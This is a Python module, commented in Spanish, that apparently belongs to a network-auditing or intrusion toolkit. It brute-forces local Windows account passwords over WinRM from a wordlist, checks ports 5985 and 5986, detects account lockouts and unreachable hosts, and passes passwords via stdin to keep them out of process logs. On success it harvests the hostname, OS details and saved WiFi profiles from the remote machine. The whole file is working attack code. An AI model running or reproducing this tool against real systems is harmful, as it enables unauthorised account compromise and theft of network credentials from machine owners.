"""Prueba de credenciales via WinRM (Invoke-Command) y, si funcionan,
extraccion del SO exacto y perfiles WiFi guardados en el equipo remoto.
Usa cuentas LOCALES ('IP\\usuario'), igual criterio que smb_cred.py."""
from __future__ import annotations

import json
import socket
import subprocess
import time
from pathlib import Path
from typing import Optional, Tuple

_HELPER_PATH = Path(__file__).parent / "winrm_helper.ps1"


def _winrm_port_open(ip: str, timeout_s: float = 1.5) -> bool:
    """WinRM escucha en 5985 (HTTP) / 5986 (HTTPS). Un probe TCP corto evita
    lanzar un powershell+Invoke-Command por cada palabra de la wordlist cuando
    el puerto esta cerrado (caso comun: 445 abierto, 5985 cerrado)."""
    for port in (5985, 5986):
        try:
            with socket.create_connection((ip, port), timeout=timeout_s):
                return True
        except Exception:
            continue
    return False


def _run_helper(ip: str, username: str, password: str, action: str, timeout_s: float) -> Tuple[bool, str]:
    # La contrasena se pasa por stdin, NUNCA como argumento de linea de
    # comandos: el argv de powershell.exe es visible para cualquier proceso
    # local (Administrador de tareas, Sysmon Event ID 1, Script Block
    # Logging) y quedaria expuesta en texto plano por cada palabra probada.
    cmd = [
        "powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
        "-File", str(_HELPER_PATH),
        "-ComputerName", ip, "-Username", username, "-Action", action,
    ]
    try:
        proc = subprocess.run(
            cmd,
            input=f"{password}\n",
            capture_output=True,
            text=True,
            timeout=timeout_s,
        )
    except subprocess.TimeoutExpired:
        return False, "timeout"
    except Exception as exc:
        return False, str(exc)
    return True, proc.stdout


def try_winrm_login(ip: str, username: str, password: str, timeout_s: float = 12.0) -> str:
    """Devuelve 'success' | 'fail' | 'locked' | 'unreachable'."""
    ok, output = _run_helper(ip, username, password, "test", timeout_s)
    if not ok:
        return "unreachable"
    if "RESULT:SUCCESS" in output:
        return "success"
    lowered = output.lower()
    ## El helper emite 'RESULT:FAIL:<Exception.Message>'. Un fallo de conexion
    ## WinRM (WSMan) NO es "password incorrecta" -> es 'unreachable', para
    ## cortar en el primer intento en vez de martillar toda la wordlist.
    if any(s in lowered for s in ("wsman", "cannot connect", "no se puede", "winrm cannot", "connecting to remote server")):
        return "unreachable"
    ## Bloqueo de cuenta (best-effort: WinRM/Negotiate suele reportarlo como
    ## 'access is denied' generico, pero cuando el texto lo dice, se detecta).
    if any(s in lowered for s in ("locked out", "1909", "bloqueada", "cuenta esta bloqueada")):
        return "locked"
    return "fail"


def harvest_via_winrm(ip: str, username: str, password: str, timeout_s: float = 15.0) -> Optional[dict]:
    """Solo llamar con credenciales ya confirmadas. Devuelve un dict con
    hostname/OSCaption/OSVersion/WifiProfiles, o None si fallo."""
    ok, output = _run_helper(ip, username, password, "harvest", timeout_s)
    if not ok or "RESULT:SUCCESS" not in output:
        return None
    lines = output.splitlines()
    json_lines = [l for l in lines if l.strip() and not l.startswith("RESULT:")]
    if not json_lines:
        return None
    try:
        return json.loads("\n".join(json_lines))
    except Exception:
        return None


def get_os_via_cim(ip: str, username: str, password: str, timeout_s: float = 12.0) -> Optional[dict]:
    """Obtiene hostname/SO exacto via WMI/CIM sobre DCOM (puerto 135), que
    suele funcionar aunque WinRM este deshabilitado. Solo llamar con
    credenciales ya confirmadas."""
    ok, output = _run_helper(ip, username, password, "osonly", timeout_s)
    if not ok or "RESULT:SUCCESS" not in output:
        return None
    lines = [l for l in output.splitlines() if l.strip() and not l.startswith("RESULT:")]
    if not lines:
        return None
    try:
        return json.loads("\n".join(lines))
    except Exception:
        return None


def crack_winrm_account(ip: str, username: str, wordlist, delay_s: float = 2.0, max_attempts: Optional[int] = None):
    ## Corto-circuito: si ni 5985 ni 5986 estan abiertos, no tiene sentido
    ## lanzar N intentos (cada uno arranca un powershell) -> unreachable ya.
    if not _winrm_port_open(ip):
        return "unreachable", None, 0

    attempts = 0
    limit = max_attempts or len(wordlist)
    for password in wordlist[:limit]:
        attempts += 1
        outcome = try_winrm_login(ip, username, password)
        if outcome == "success":
            return "cracked", password, attempts
        if outcome == "locked":
            return "locked", None, attempts  # deja de martillar una cuenta ya bloqueada
        if outcome == "unreachable":
            return "unreachable", None, attempts
        time.sleep(delay_s)
    return "not_found", None, attempts
